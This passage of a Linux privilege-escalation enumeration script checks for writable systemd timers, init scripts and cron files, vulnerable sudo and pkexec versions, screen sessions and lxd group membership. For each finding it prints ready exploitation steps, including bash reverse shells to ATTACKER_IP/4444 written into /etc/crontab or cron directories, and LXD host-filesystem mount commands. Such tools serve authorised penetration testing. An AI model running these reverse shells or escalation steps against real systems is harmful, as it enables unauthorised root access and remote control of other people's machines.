    find ~/.config/systemd/user -type f -writable 2>/dev/null 2>/dev/null | while read -r file; do
        if [ -f "$file" ]; then
            warning "Writable user systemd service: $file"
        fi
    done
else
    info "systemctl not found (not systemd)"
fi

################################################################################
# 19. SYSTEMD TIMERS
################################################################################
progress "Systemd Timers"
section "19. SYSTEMD TIMERS"

if command -v systemctl >/dev/null 2>&1; then
    info "System timers:"
    systemctl list-timers 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Writable timer files:"
    find /etc/systemd/system -name "*.timer" -type f -writable 2>/dev/null | while read -r file; do
        critical "Writable systemd timer: $file"
        show_exploit "Writable Systemd Timer" \
            "Modify timer to execute malicious service, then reload." \
            "Modify $file to point to malicious service\nsystemctl daemon-reload\nsystemctl enable --now $(basename $file .timer)"
    done
fi

################################################################################
# 20. MOUNTED FILESYSTEMS
################################################################################
progress "Mounted Filesystems"
section "20. MOUNTED FILESYSTEMS"

info "Mounted filesystems:"
mount | tee -a "$OUTPUT_FILE"

log ""
info "Checking for noexec, nosuid, nodev flags:"
mount | grep -E "noexec|nosuid|nodev" | tee -a "$OUTPUT_FILE"

log ""
info "Checking for interesting mounts:"
mount | grep -E "tmpfs|proc|sysfs|devtmpfs" | tee -a "$OUTPUT_FILE"

################################################################################
# 21. INIT SCRIPTS
################################################################################
progress "Init Scripts"
section "21. INIT SCRIPTS"

if [ -d /etc/init.d ]; then
    info "Writable init scripts:"
    find /etc/init.d -type f -writable 2>/dev/null | while read -r file; do
        critical "Writable init script: $file"
        show_exploit "Writable Init Script" \
            "Modify init script to add reverse shell or malicious command." \
            "Add to $file:\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n# Then restart service or reboot"
    done
fi

################################################################################
# 22. Writable /etc/crontab
################################################################################
progress "Cron Files Check"
section "22. WRITABLE CRON FILES"

if [ -w /etc/crontab ]; then
    critical "/etc/crontab is writable!"
    show_exploit "Writable /etc/crontab" \
        "Add malicious cron job that runs as root." \
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' >> /etc/crontab"
fi

for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -w "$dir" ]; then
        critical "Writable cron directory: $dir"
        show_exploit "Writable Cron Directory" \
            "Create new cron file in this directory." \
            "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > $dir/exploit"
    fi
done

################################################################################
# 23. SUDO VERSION VULNERABILITIES
################################################################################
progress "Sudo Version Check"
section "23. SUDO VERSION CHECK"

if command -v sudo >/dev/null 2>&1; then
    SUDO_VERSION=$(sudo -V 2>/dev/null | head -n1)
    info "Sudo version: $SUDO_VERSION"
    
    VERSION_NUM=$(echo "$SUDO_VERSION" | grep -oP 'Sudo version \K[0-9.]+' || echo "")
    if [ -n "$VERSION_NUM" ]; then
        MAJOR=$(echo "$VERSION_NUM" | cut -d. -f1)
        MINOR=$(echo "$VERSION_NUM" | cut -d. -f2)
        PATCH=$(echo "$VERSION_NUM" | cut -d. -f3 | cut -dp -f1)
        
        # CVE-2021-3156 (Baron Samedit)
        if [ "$MAJOR" -eq 1 ]; then
            if [ "$MINOR" -eq 8 ] && [ "$PATCH" -lt 32 ]; then
                critical "Vulnerable to CVE-2021-3156 (Baron Samedit)!"
                show_exploit "CVE-2021-3156 (Baron Samedit)" \
                    "Heap-based buffer overflow. Exploit available." \
                    "Check: https://github.com/blasty/CVE-2021-3156\nsudoedit -s /"
            elif [ "$MINOR" -eq 9 ] && [ "$PATCH" -lt 6 ]; then
                critical "Vulnerable to CVE-2021-3156 (Baron Samedit)!"
                show_exploit "CVE-2021-3156 (Baron Samedit)" \
                    "Heap-based buffer overflow. Exploit available." \
                    "Check: https://github.com/blasty/CVE-2021-3156"
            fi
        fi
    fi
    
    warning "Check for known sudo vulnerabilities (CVE-2019-14287, CVE-2021-3156, etc.)"
fi

################################################################################
# 24. ADDITIONAL CHECKS
################################################################################
progress "Additional Checks"
section "24. ADDITIONAL VULNERABILITY CHECKS"

# Check for Polkit/pkexec
if command -v pkexec >/dev/null 2>&1; then
    info "pkexec found - checking for PwnKit (CVE-2021-4034)..."
    PKEXEC_VERSION=$(pkexec --version 2>/dev/null || echo "unknown")
    info "pkexec version: $PKEXEC_VERSION"
    warning "Check for PwnKit vulnerability (CVE-2021-4034)"
    show_exploit "PwnKit (CVE-2021-4034)" \
        "Local privilege escalation in polkit's pkexec." \
        "Check: https://github.com/arthepsy/CVE-2021-4034\npkexec --version  # Check version"
fi

# Check for screen/tmux sessions
info "Checking for screen/tmux sessions..."
if command -v screen >/dev/null 2>&1; then
    SCREEN_SESSIONS=$(screen -ls 2>/dev/null | grep -v "No Sockets" || echo "")
    if [ -n "$SCREEN_SESSIONS" ]; then
        warning "Screen sessions found (may contain root sessions):"
        echo "$SCREEN_SESSIONS" | tee -a "$OUTPUT_FILE"
        show_exploit "Screen Session Hijacking" \
            "If screen session is owned by root, try to attach." \
            "screen -x root/<session_name>\n# Or check /var/run/screen/"
    fi
fi

if command -v tmux >/dev/null 2>&1; then
    TMUX_SESSIONS=$(tmux ls 2>/dev/null || echo "")
    if [ -n "$TMUX_SESSIONS" ]; then
        warning "Tmux sessions found:"
        echo "$TMUX_SESSIONS" | tee -a "$OUTPUT_FILE"
    fi
fi

# Check for LXD/LXC
if command -v lxc >/dev/null 2>&1; then
    info "LXC found - checking if user is in lxd group..."
    if groups | grep -q lxd; then
        critical "User is in lxd group - potential container escape!"
        show_exploit "LXD Group Privilege Escalation" \
            "Create privileged container and mount host filesystem." \
            "lxc init ubuntu:16.04 test -c security.privileged=true\nlxc config device add test rootdisk disk path=/ rootfs=/\nlxc start test\nlxc exec test bash"
    fi
fi

################################################################################
# 25. SUMMARY AND RECOMMENDATIONS
################################################################################
progress "Final Summary"
section "25. SUMMARY AND RECOMMENDATIONS"

echo ""
echo -e "${BRIGHT_GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_GREEN}║                    ENUMERATION COMPLETE                             ║${NC}"
echo -e "${BRIGHT_GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

info "Report saved to: $OUTPUT_FILE"
info "Exploit methods saved to: $EXPLOIT_FILE"

log ""
log "═══════════════════════════════════════════════════════════════════════"
log "SUMMARY"
log "═══════════════════════════════════════════════════════════════════════"

echo ""
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}                    NEXT STEPS & RECOMMENDATIONS                        ${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════════════${NC}"
echo ""

warning "1. Review the exploit methods file: $EXPLOIT_FILE"
warning "2. Research kernel exploits for: $(uname -r)"
warning "3. Check for known CVEs in installed software versions"
warning "4. Test SUID binaries for exploitation methods"
warning "5. Verify sudo permissions and test for bypasses"
warning "6. Check for misconfigured services and cron jobs"
warning "7. Look for writable system files and directories"
warning "8. Check for exposed credentials in history files"
warning "9. Test Docker/container escape if applicable"
warning "10. Verify network services for additional attack surface"

echo ""
echo -e "${CYAN}Useful Resources:${NC}"
echo -e "  • Exploit-DB: https://www.exploit-db.com"
echo -e "  • GTFOBins: https://gtfobins.github.io"
echo -e "  • Linux Kernel Exploits: https://github.com/SecWiki/linux-kernel-exploits"
echo -e "  • LinPEAS: https://github.com/carlospolop/PEASS-ng"
echo ""

echo -e "${BRIGHT_GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_GREEN}║  Scan completed successfully! Check the report files above.        ║${NC}"
echo -e "${BRIGHT_GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""
